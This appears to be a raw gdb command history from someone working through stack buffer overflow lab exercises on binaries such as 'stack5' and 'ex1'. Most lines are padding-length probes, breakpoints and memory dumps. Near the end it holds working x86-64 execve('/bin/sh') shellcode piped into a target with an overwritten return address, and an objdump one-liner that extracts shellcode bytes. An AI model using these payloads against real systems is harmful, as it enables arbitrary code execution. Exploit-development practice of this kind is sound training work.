r <<< `python -c 'print "A"*64 + "\x37\x0
n
delete break point
quit
r <<< `python -c 'print "A"*64 + "\x37\x05\x40"'`
quit
disassemble main
break *0x400548
r <<< `python -c 'print "A"*64 + "\x37\x05\x40"'`
p $rbp
n
x/40wx $rbp-10
quit
r <<< `python -c 'print "A"*64 + "\x70\x05\x40"'`
p wim
r <<< `python -c 'print "A"*80 + "\x37\x05\x40"'`
quit
r <<< `python -c 'print "A"*80 + "\x37\x05\x40"'`
r <<< `python -c 'print "A"*64 + "\x37\x05\x40"'`
break main
r <<< `python -c 'print "A"*64 + "\x37\x05\x40"'`
p $rbp
quit
r <<< `python -c 'print "A"*80 + "\x37\x05\x40"'`
quit
r <<< `python -c 'print "A"*70 + "\x37\x05\x40"'`
quit
r <<< `python -c 'print "A"*64 + "\x37\x05\x40"'`
r <<< `python -c 'print "A"*66 + "\x37\x05\x40"'`
r <<< `python -c 'print "A"*68 + "\x37\x05\x40"'`
r <<< `python -c 'print "A"*70 + "\x37\x05\x40"'`
quit
r <<< `python -c 'print "A"*74 + "\x37\x05\x40"'`
quit
r <<< `python -c 'print "A"*64 + "\x00\x37\x05\x40"'`
quit
break point main
bp main
clear
break main
disassemble main
p win
p wim
r <<< `python -c 'print "A"*72 + "\x37\x05\x40\x00\x00\x00\x00\x00"'`
next
continue
next
quit
disassemble win
disassemble wim
r <<< `python -c 'print "A"*72 + "\x37\x05\x40\x00\x00\x00\x00\x00"'`
quit
disas main
disasemble main
disassemble main
break main
q
disas main
r "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
break main
r <<< "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
ni
x/30wx &rbp
x/30wx &rsp
ni
x/30wx &rbp
ni
r <<< "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
ni
x/32wx $rsp
x/32gx $rsp
continue
disasa main
disas main
b *main+32
r
continue
AAAAAAAAAAAAAAA
q
b *main+32
r
continue
ni
q
b *main+32
r
x/32gx $rbp
x/32gx $rsp
q
x/32gx $rsp-128
q
q
x/32gx $rsp-128
p main
q
b info
info b
break main
info b
disas main
q
disas main
break main
r <<< `python -c 'print "A"*64'`
ni
x/40wx $rbp-0x50
ni
x/40wx $rbp-0x50
ni
q
disas main
break main
r <<< `python -c 'print "A"*76 + "dcba"'`
continue
r <<< `python -c 'print "A"*76 + "dcba"'`
ni
info b
remove break
del 1
r <<< `python -c 'print "A"*76 + "dcba"'`
r <<< `python -c 'print "A"*76 + "\xd\xc\xb\xa"'`
r <<< `python -c 'print "A"*76 + "\x64\x63\x62\x61"'`
r `python -c 'print "A"*76 + "dcba"'`
q
disas main
b *main+38
r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
x/50wx &rsp
x/50wx &rsp+0x130
ni
info b
del 1
disas main
b *main+32
run aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
ni
run aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
x/50wx $rsp
ni
x/50wx $rsp
x/50wx $rbp
q
disas
break main
r <<< aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
ni
x/50wx $rbp
x/50wx $rsp
continue
q
disas main
r <<< `python -c 'print "A"*72'`
ni
q
disas main
b main
r <<< aaaaaaaaaaaaaaaaaaaaaaaaa
ni
p $rsp-0x50
p $rbp+0x8
q
disas main
q
b *main+38
r $(python -c 'print "A"*100')
x/40wx $rsp
x/200x $rsp
ni
ni
r $(python -c 'print "A"*100')
ni
q
b main
r $(python -c 'print "A"*100')
ni
x/40wx $rsp
continue
r <<< $(python -c 'print "A"*100')
ni
x/40wx $rsp
x/40x $rsp
continue
disas main
q
disas main
break main
r <<< $(python -c 'print "A"*100')
ni
x/40x $rsp
q
x/32gx $rsp-128
q
x/32gx $rsp-128
q
x/32gx $rsp-128
x/32gx $rsp
x/32gx $rbp
x/32wx $rbp
q
x/32gx $rsp-128
q
q
x/32gx $rsp-128
x/32w $rsp-128
q
q
python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+ "A"*45 + "\x30\xde\xff\xff\xff\x7f"'; cat
(python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+ "A"*45 + "\x30\xde\xff\xff\xff\x7f"'; cat) | ./stack5
./stack5
q
r <<< (python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+ "A"*45 + "\x30\xde\xff\xff\xff\x7f"'; cat)
ls
cat stack5.c
q
p win
python -c 'print "A"*24 + "\x77\x05\x40" | ./ex1
python -c 'print "A"*24 + "\x77\x05\x40"' | ./ex1
q
r <<< `python -c 'print "A"*24 + "\x77\x05\x40"`
disas main
break main
p win
r <<< `python -c 'print "A"*24 + "\x77\x05\x40"'`
ni
del 1
r <<< `python -c 'print "A"*24 + "\x77\x05\x40"'`
p win
q
disas main
r <<< (python -c 'print "A"*30')
break main
r <<< (python -c 'print "A"*30')
ni
q
disas main
b *main+32
r
x/32gx $rsp
q
r <<< (python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "A"*45 + "\x90\xde\xff\xff\xff\x7f"'; cat)'
id
ls
./execve64
id
ls
q
objdump -d ./evecve64|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:| cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' "\x48\x31\xc0\x50\x48\xb8\x2f\x2f\x62\x69\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"
ls
q
./shellText1
ls
q
ls
q
./execve64
q
